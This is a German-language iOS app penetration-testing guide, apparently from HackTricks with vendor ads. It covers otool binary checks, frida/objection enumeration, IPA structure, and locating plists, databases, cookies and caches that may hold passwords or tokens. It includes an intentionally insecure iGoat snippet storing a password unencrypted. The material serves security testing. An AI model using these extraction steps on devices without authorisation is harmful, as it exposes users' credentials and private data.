# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
{% endhint %}

## iOS Grundlagen

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Testumgebung

Auf dieser Seite finden Sie Informationen √ºber den **iOS-Simulator**, **Emulatoren** und **Jailbreaking:**

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Erste Analyse

### Grundlegende iOS-Testoperationen

W√§hrend des Tests **werden mehrere Operationen vorgeschlagen** (Verbinden mit dem Ger√§t, Lesen/Schreiben/Hochladen/Herunterladen von Dateien, Verwendung einiger Tools...). Wenn Sie also nicht wissen, wie Sie eine dieser Aktionen ausf√ºhren, lesen Sie bitte **die Seite**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
F√ºr die folgenden Schritte **sollte die App installiert sein** und die **IPA-Datei** der Anwendung sollte bereits vorliegen.\
Lesen Sie die [Grundlegenden iOS-Testoperationen](basic-ios-testing-operations.md) Seite, um zu erfahren, wie Sie dies tun.
{% endhint %}

### Grundlegende statische Analyse

Es wird empfohlen, das Tool [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) zu verwenden, um eine automatische statische Analyse der IPA-Datei durchzuf√ºhren.

Identifizierung von **Schutzma√ünahmen, die im Bin√§rformat vorhanden sind**:

*   **PIE (Position Independent Executable)**: Wenn aktiviert, wird die Anwendung jedes Mal an einer zuf√§lligen Speicheradresse geladen, was es schwieriger macht, ihre urspr√ºngliche Speicheradresse vorherzusagen.

```bash
otool -hv <app-binary> | grep PIE   # Es sollte das PIE-Flag enthalten
```
*   **Stack Canaries**: Um die Integrit√§t des Stacks zu validieren, wird ein ‚ÄûCanary‚Äú-Wert auf den Stack gelegt, bevor eine Funktion aufgerufen wird, und nach dem Ende der Funktion erneut validiert.

```bash
otool -I -v <app-binary> | grep stack_chk   # Es sollte die Symbole: stack_chk_guard und stack_chk_fail enthalten
```
*   **ARC (Automatic Reference Counting)**: Um h√§ufige Speicherbesch√§digungsfehler zu verhindern

```bash
otool -I -v <app-binary> | grep objc_release   # Es sollte das _objc_release-Symbol enthalten
```
*   **Verschl√ºsselte Bin√§rdatei**: Die Bin√§rdatei sollte verschl√ºsselt sein

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Der cryptid sollte 1 sein
```

**Identifizierung von sensiblen/unsicheren Funktionen**

*   **Schwache Hash-Algorithmen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Auf Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Unsichere Zufallsfunktionen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Auf Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Unsichere 'Malloc'-Funktion**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_malloc"

# Auf Linux
grep -iER "_malloc"
```
*   **Unsichere und verwundbare Funktionen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Auf Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Grundlegende dynamische Analyse

√úberpr√ºfen Sie die dynamische Analyse, die [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) durchf√ºhrt. Sie m√ºssen durch die verschiedenen Ansichten navigieren und mit ihnen interagieren, aber es wird mehrere Klassen hooken, w√§hrend es andere Dinge tut, und einen Bericht erstellen, sobald Sie fertig sind.

### Auflistung installierter Apps

Verwenden Sie den Befehl `frida-ps -Uai`, um die **Bundle-ID** der installierten Apps zu bestimmen:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Grundlegende Enumeration & Hooking

Lernen Sie, wie man **die Komponenten der Anwendung enumeriert** und wie man einfach **Methoden und Klassen mit Objection hookt**:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA-Struktur

Die Struktur einer **IPA-Datei** ist im Wesentlichen die eines **zipped Pakets**. Durch Umbenennen der Erweiterung in `.zip` kann sie **dekomprimiert** werden, um ihren Inhalt zu enth√ºllen. Innerhalb dieser Struktur stellt ein **Bundle** eine vollst√§ndig verpackte Anwendung dar, die bereit f√ºr die Installation ist. Darin finden Sie ein Verzeichnis mit dem Namen `<NAME>.app`, das die Ressourcen der Anwendung kapselt.

* **`Info.plist`**: Diese Datei enth√§lt spezifische Konfigurationsdetails der Anwendung.
* **`_CodeSignature/`**: Dieses Verzeichnis enth√§lt eine plist-Datei, die eine Signatur enth√§lt und die Integrit√§t aller Dateien im Bundle sicherstellt.
* **`Assets.car`**: Ein komprimiertes Archiv, das Asset-Dateien wie Icons speichert.
* **`Frameworks/`**: Dieser Ordner beherbergt die nativen Bibliotheken der Anwendung, die in Form von `.dylib` oder `.framework`-Dateien vorliegen k√∂nnen.
* **`PlugIns/`**: Dies kann Erweiterungen der Anwendung enthalten, die als `.appex`-Dateien bekannt sind, obwohl sie nicht immer vorhanden sind. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Es wird verwendet, um die permanenten Daten Ihrer Anwendung f√ºr die Offline-Nutzung zu speichern, tempor√§re Daten zwischenzuspeichern und eine R√ºckg√§ngig-Funktionalit√§t f√ºr Ihre App auf einem einzelnen Ger√§t hinzuzuf√ºgen. Um Daten √ºber mehrere Ger√§te in einem einzigen iCloud-Konto zu synchronisieren, spiegelt Core Data automatisch Ihr Schema in einen CloudKit-Container.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Die `PkgInfo`-Datei ist eine alternative M√∂glichkeit, die Typ- und Ersteller-Codes Ihrer Anwendung oder Ihres Bundles anzugeben.
* **en.lproj, fr.proj, Base.lproj**: Sind die Sprachpakete, die Ressourcen f√ºr diese spezifischen Sprachen enthalten, sowie eine Standardressource f√ºr den Fall, dass eine Sprache nicht unterst√ºtzt wird.
* **Sicherheit**: Das Verzeichnis `_CodeSignature/` spielt eine entscheidende Rolle f√ºr die Sicherheit der App, indem es die Integrit√§t aller geb√ºndelten Dateien durch digitale Signaturen √ºberpr√ºft.
* **Asset-Management**: Die Datei `Assets.car` verwendet Kompression, um grafische Assets effizient zu verwalten, was entscheidend f√ºr die Optimierung der Anwendungsleistung und die Reduzierung ihrer Gesamtgr√∂√üe ist.
* **Frameworks und PlugIns**: Diese Verzeichnisse unterstreichen die Modularit√§t von iOS-Anwendungen, die es Entwicklern erm√∂glichen, wiederverwendbare Codebibliotheken (`Frameworks/`) einzuschlie√üen und die Funktionalit√§t der App zu erweitern (`PlugIns/`).
* **Lokalisierung**: Die Struktur unterst√ºtzt mehrere Sprachen und erleichtert die globale Reichweite der Anwendung, indem Ressourcen f√ºr spezifische Sprachpakete enthalten sind.

**Info.plist**

Die **Info.plist** dient als Grundpfeiler f√ºr iOS-Anwendungen und kapselt wichtige Konfigurationsdaten in Form von **Schl√ºssel-Wert**-Paaren. Diese Datei ist eine Voraussetzung nicht nur f√ºr Anwendungen, sondern auch f√ºr App-Erweiterungen und Frameworks, die darin geb√ºndelt sind. Sie ist entweder im XML- oder im Bin√§rformat strukturiert und enth√§lt kritische Informationen, die von App-Berechtigungen bis zu Sicherheitskonfigurationen reichen. F√ºr eine detaillierte Erkundung der verf√ºgbaren Schl√ºssel kann auf die [**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc) verwiesen werden.

F√ºr diejenigen, die mit dieser Datei in einem zug√§nglicheren Format arbeiten m√∂chten, kann die XML-Konvertierung m√ºhelos durch die Verwendung von `plutil` auf macOS (verf√ºgbar nativ in Versionen 10.2 und sp√§ter) oder `plistutil` auf Linux erreicht werden. Die Befehle zur Konvertierung sind wie folgt:

* **F√ºr macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
* **F√ºr Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Unter den zahlreichen Informationen, die die **Info.plist**-Datei preisgeben kann, sind bemerkenswerte Eintr√§ge wie App-Berechtigungsstrings (`UsageDescription`), benutzerdefinierte URL-Schemata (`CFBundleURLTypes`) und Konfigurationen f√ºr App Transport Security (`NSAppTransportSecurity`). Diese Eintr√§ge, zusammen mit anderen wie exportierten/importierten benutzerdefinierten Dokumenttypen (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), k√∂nnen m√ºhelos durch Inspektion der Datei oder durch Verwendung eines einfachen `grep`-Befehls gefunden werden:
```bash
$ grep -i <keyword> Info.plist
```
**Datenpfade**

Im iOS-Umfeld sind Verzeichnisse speziell f√ºr **Systemanwendungen** und **vom Benutzer installierte Anwendungen** vorgesehen. Systemanwendungen befinden sich im Verzeichnis `/Applications`, w√§hrend vom Benutzer installierte Apps unter `/var/mobile/containers/Data/Application/` abgelegt werden. Diese Anwendungen erhalten eine eindeutige Kennung, die als **128-Bit UUID** bekannt ist, was die manuelle Lokalisierung des App-Ordners aufgrund der Zuf√§lligkeit der Verzeichnisnamen erschwert.

{% hint style="warning" %}
Da Anwendungen in iOS sandboxed sein m√ºssen, hat jede App auch einen Ordner innerhalb von **`$HOME/Library/Containers`** mit der **`CFBundleIdentifier`** der App als Ordnernamen.

Beide Ordner (Daten- und Containerordner) enthalten jedoch die Datei **`.com.apple.mobile_container_manager.metadata.plist`**, die beide Dateien im Schl√ºssel `MCMetadataIdentifier` verkn√ºpft.
{% endhint %}

Um die Entdeckung des Installationsverzeichnisses einer vom Benutzer installierten App zu erleichtern, bietet das **objection tool** einen n√ºtzlichen Befehl, `env`. Dieser Befehl zeigt detaillierte Verzeichnisinformationen f√ºr die betreffende App an. Nachfolgend ein Beispiel, wie man diesen Befehl verwendet:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternativ kann der App-Name innerhalb von `/private/var/containers` mit dem Befehl `find` gesucht werden:
```bash
find /private/var/containers -name "Progname*"
```
Befehle wie `ps` und `lsof` k√∂nnen ebenfalls verwendet werden, um den Prozess der App zu identifizieren und offene Dateien aufzulisten, was Einblicke in die aktiven Verzeichnispfade der Anwendung bietet:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Bundle-Verzeichnis:**

* **AppName.app**
* Dies ist das Anwendungsbundle, wie zuvor im IPA gesehen, es enth√§lt essentielle Anwendungsdaten, statische Inhalte sowie die kompilierte Bin√§rdatei der Anwendung.
* Dieses Verzeichnis ist f√ºr Benutzer sichtbar, aber **Benutzer k√∂nnen nicht darin schreiben**.
* Inhalte in diesem Verzeichnis werden **nicht gesichert**.
* Der Inhalt dieses Ordners wird verwendet, um die **Code-Signatur** zu **validieren**.

**Datenverzeichnis:**

* **Documents/**
* Enth√§lt alle vom Benutzer generierten Daten. Der Endbenutzer der Anwendung initiiert die Erstellung dieser Daten.
* Sichtbar f√ºr Benutzer und **Benutzer k√∂nnen darin schreiben**.
* Inhalte in diesem Verzeichnis werden **gesichert**.
* Die App kann Pfade deaktivieren, indem sie `NSURLIsExcludedFromBackupKey` setzt.
* **Library/**
* Enth√§lt alle **Dateien, die nicht benutzerspezifisch sind**, wie **Caches**, **Einstellungen**, **Cookies** und Konfigurationsdateien im Property List (plist)-Format.
* iOS-Apps verwenden normalerweise die Unterverzeichnisse `Application Support` und `Caches`, aber die App kann benutzerdefinierte Unterverzeichnisse erstellen.
* **Library/Caches/**
* Enth√§lt **semi-permanente zwischengespeicherte Dateien.**
* Unsichtbar f√ºr Benutzer und **Benutzer k√∂nnen nicht darin schreiben**.
* Inhalte in diesem Verzeichnis werden **nicht gesichert**.
* Das Betriebssystem kann die Dateien dieses Verzeichnisses automatisch l√∂schen, wenn die App nicht l√§uft und der Speicherplatz knapp wird.
* **Library/Application Support/**
* Enth√§lt **persistente** **Dateien**, die zum Ausf√ºhren der App erforderlich sind.
* **Unsichtbar** **f√ºr** **Benutzer** und Benutzer k√∂nnen nicht darin schreiben.
* Inhalte in diesem Verzeichnis werden **gesichert**.
* Die App kann Pfade deaktivieren, indem sie `NSURLIsExcludedFromBackupKey` setzt.
* **Library/Preferences/**
* Wird verwendet, um Eigenschaften zu speichern, die **auch nach einem Neustart der Anwendung bestehen bleiben k√∂nnen**.
* Informationen werden unverschl√ºsselt im Anwendungs-Sandbox in einer plist-Datei namens \[BUNDLE\_ID].plist gespeichert.
* Alle Schl√ºssel/Wert-Paare, die mit `NSUserDefaults` gespeichert werden, sind in dieser Datei zu finden.
* **tmp/**
* Verwenden Sie dieses Verzeichnis, um **tempor√§re Dateien** zu schreiben, die zwischen den App-Starts nicht bestehen bleiben m√ºssen.
* Enth√§lt nicht-persistente zwischengespeicherte Dateien.
* **Unsichtbar** f√ºr Benutzer.
* Inhalte in diesem Verzeichnis werden nicht gesichert.
* Das Betriebssystem kann die Dateien dieses Verzeichnisses automatisch l√∂schen, wenn die App nicht l√§uft und der Speicherplatz knapp wird.

Lassen Sie uns einen genaueren Blick auf das Anwendungsbundle (.app) Verzeichnis von iGoat-Swift im Bundle-Verzeichnis (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) werfen:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

Im `<application-name>.app`-Ordner finden Sie eine Bin√§rdatei namens `<application-name>`. Dies ist die Datei, die **ausgef√ºhrt** wird. Sie k√∂nnen eine grundlegende Inspektion der Bin√§rdatei mit dem Tool **`otool`** durchf√ºhren:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**√úberpr√ºfen Sie, ob die App verschl√ºsselt ist**

Sehen Sie nach, ob es eine Ausgabe f√ºr gibt:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Disassemblierung der Bin√§rdatei**

Disassemblieren Sie den Textabschnitt:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Um das **Objective-C-Segment** der Beispielanwendung auszudrucken, kann man Folgendes verwenden:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Um einen kompakteren Objective-C-Code zu erhalten, k√∂nnen Sie [**class-dump**](http://stevenygard.com/projects/class-dump/) verwenden:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Allerdings sind die besten Optionen, um die Bin√§rdatei zu disassemblieren: [**Hopper**](https://www.hopperapp.com/download.html?) und [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Datenspeicherung

Um zu erfahren, wie iOS Daten auf dem Ger√§t speichert, lesen Sie diese Seite:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Die folgenden Orte zur Speicherung von Informationen sollten **unmittelbar nach der Installation der Anwendung**, **nach √úberpr√ºfung aller Funktionen** der Anwendung und sogar nach **dem Abmelden von einem Benutzer und dem Anmelden bei einem anderen** √ºberpr√ºft werden.\
Das Ziel ist es, **unprotected sensitive information** der Anwendung (Passw√∂rter, Tokens), des aktuellen Benutzers und von zuvor angemeldeten Benutzern zu finden.
{% endhint %}

### Plist

**plist**-Dateien sind strukturierte XML-Dateien, die **Schl√ºssel-Wert-Paare** enthalten. Es ist eine M√∂glichkeit, persistente Daten zu speichern, daher k√∂nnen Sie manchmal **sensible Informationen in diesen Dateien** finden. Es wird empfohlen, diese Dateien nach der Installation der App und nach intensiver Nutzung zu √ºberpr√ºfen, um zu sehen, ob neue Daten geschrieben werden.

Der gebr√§uchlichste Weg, um Daten in plist-Dateien zu persistieren, ist die Verwendung von **NSUserDefaults**. Diese plist-Datei wird im App-Sandbox unter **`Library/Preferences/<appBundleID>.plist`** gespeichert.

Die [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) Klasse bietet eine programmgesteuerte Schnittstelle zur Interaktion mit dem Standardsystem. Das Standardsystem erm√∂glicht es einer Anwendung, ihr Verhalten gem√§√ü **Benutzereinstellungen** anzupassen. Daten, die von `NSUserDefaults` gespeichert werden, k√∂nnen im Anwendungsbundle angezeigt werden. Diese Klasse speichert **Daten** in einer **plist**-**Datei**, ist jedoch f√ºr die Verwendung mit kleinen Datenmengen gedacht.

Diese Daten k√∂nnen nicht mehr direkt √ºber einen vertrauensw√ºrdigen Computer zugegriffen werden, k√∂nnen jedoch durch das Durchf√ºhren eines **Backups** abgerufen werden.

Sie k√∂nnen die Informationen, die mit **`NSUserDefaults`** gespeichert wurden, mit objections `ios nsuserdefaults get` **dumpen**.

Um alle von der Anwendung verwendeten plist-Dateien zu finden, k√∂nnen Sie auf `/private/var/mobile/Containers/Data/Application/{APPID}` zugreifen und Folgendes ausf√ºhren:
```bash
find ./ -name "*.plist"
```
Um Dateien von **XML oder bin√§r (bplist)** Format in XML zu konvertieren, stehen je nach Betriebssystem verschiedene Methoden zur Verf√ºgung:

**F√ºr macOS-Benutzer:** Verwenden Sie den Befehl `plutil`. Es ist ein integriertes Tool in macOS (10.2+), das f√ºr diesen Zweck entwickelt wurde:
```bash
$ plutil -convert xml1 Info.plist
```
**F√ºr Linux-Benutzer:** Installieren Sie zuerst `libplist-utils`, und verwenden Sie dann `plistutil`, um Ihre Datei zu konvertieren:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Innerhalb einer Objection-Sitzung:** Zum Analysieren von mobilen Anwendungen erm√∂glicht ein spezifischer Befehl, plist-Dateien direkt zu konvertieren:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) ist ein Framework zur Verwaltung der Modellschicht von Objekten in Ihrer Anwendung. [Core Data kann SQLite als seinen persistenten Speicher verwenden](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), aber das Framework selbst ist keine Datenbank.\
CoreData verschl√ºsselt seine Daten standardm√§√üig nicht. Es kann jedoch eine zus√§tzliche Verschl√ºsselungsschicht zu CoreData hinzugef√ºgt werden. Weitere Details finden Sie im [GitHub Repo](https://github.com/project-imas/encrypted-core-data).

Sie finden die SQLite Core Data-Informationen einer Anwendung im Pfad `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Wenn Sie die SQLite √∂ffnen und auf sensible Informationen zugreifen k√∂nnen, haben Sie eine Fehlkonfiguration gefunden.**

{% code title="Code from iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) ist ein Schl√ºssel/Wert-Speicher, der auf SQLite basiert.\
Da die Yap-Datenbanken SQLite-Datenbanken sind, k√∂nnen Sie sie mit dem im vorherigen Abschnitt vorgeschlagenen Befehl finden.

### Andere SQLite-Datenbanken

Es ist √ºblich, dass Anwendungen ihre eigene SQLite-Datenbank erstellen. Sie k√∂nnten **sensible** **Daten** darauf **speichern** und sie unverschl√ºsselt lassen. Daher ist es immer interessant, jede Datenbank im Anwendungsverzeichnis zu √ºberpr√ºfen. Gehen Sie daher zum Anwendungsverzeichnis, in dem die Daten gespeichert sind (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time-Datenbanken

Entwickler k√∂nnen **Daten speichern und synchronisieren** innerhalb einer **NoSQL, cloud-hosted Datenbank** √ºber Firebase Real-Time-Datenbanken. Die Daten werden im JSON-Format gespeichert und in Echtzeit mit allen verbundenen Clients synchronisiert.

Hier erfahren Sie, wie Sie nach falsch konfigurierten Firebase-Datenbanken suchen k√∂nnen:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm-Datenbanken

[Realm Objective-C](https://realm.io/docs/objc/latest/) und [Realm Swift](https://realm.io/docs/swift/latest/) bieten eine leistungsstarke Alternative zur Datenspeicherung, die von Apple nicht bereitgestellt wird. Standardm√§√üig **speichern sie Daten unverschl√ºsselt**, wobei Verschl√ºsselung durch spezifische Konfiguration verf√ºgbar ist.

Die Datenbanken befinden sich unter: `/private/var/mobile/Containers/Data/Application/{APPID}`. Um diese Dateien zu erkunden, kann man Befehle wie verwenden:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Um diese Datenbankdateien anzuzeigen, wird das [**Realm Studio**](https://github.com/realm/realm-studio) Tool empfohlen.

Um die Verschl√ºsselung innerhalb einer Realm-Datenbank zu implementieren, kann der folgende Code-Snippet verwendet werden:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Datenbanken

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) wird als eine **leichte** und **eingebettete** Datenbank-Engine beschrieben, die den **dokumentenorientierten** (NoSQL) Ansatz verfolgt. Entwickelt f√ºr **iOS** und **macOS**, bietet es die M√∂glichkeit, Daten nahtlos zu synchronisieren.

Um potenzielle Couchbase-Datenbanken auf einem Ger√§t zu identifizieren, sollte das folgende Verzeichnis inspiziert werden:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

iOS speichert die Cookies der Apps in der **`Library/Cookies/cookies.binarycookies`** innerhalb des Ordners jeder App. Entwickler entscheiden sich jedoch manchmal, sie im **Keychain** zu speichern, da die erw√§hnte **Cookie-Datei in Backups zug√§nglich ist**.

Um die Cookie-Datei zu inspizieren, k√∂nnen Sie [**dieses Python-Skript**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) verwenden oder objections **`ios cookies get`** nutzen.\
**Sie k√∂nnen auch objection verwenden, um** diese Dateien in ein JSON-Format zu konvertieren und die Daten zu inspizieren.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Standardm√§√üig speichert NSURLSession Daten, wie **HTTP-Anfragen und -Antworten in der Cache.db**-Datenbank. Diese Datenbank kann **sensible Daten** enthalten, wenn Tokens, Benutzernamen oder andere sensible Informationen zwischengespeichert wurden. Um die zwischengespeicherten Informationen zu finden, √∂ffnen Sie das Datenverzeichnis der App (`/var/mobile/Containers/Data/Application/<UUID>`) und gehen Sie zu `/Library/Caches/<Bundle Identifier>`. Der **WebKit-Cache wird ebenfalls in der Cache.db**-Datei gespeichert. **Objection** kann die Datenbank mit dem Befehl `sqlite connect Cache.db` √∂ffnen und damit interagieren, da es sich um eine n**ormale SQLite-Datenbank** handelt.

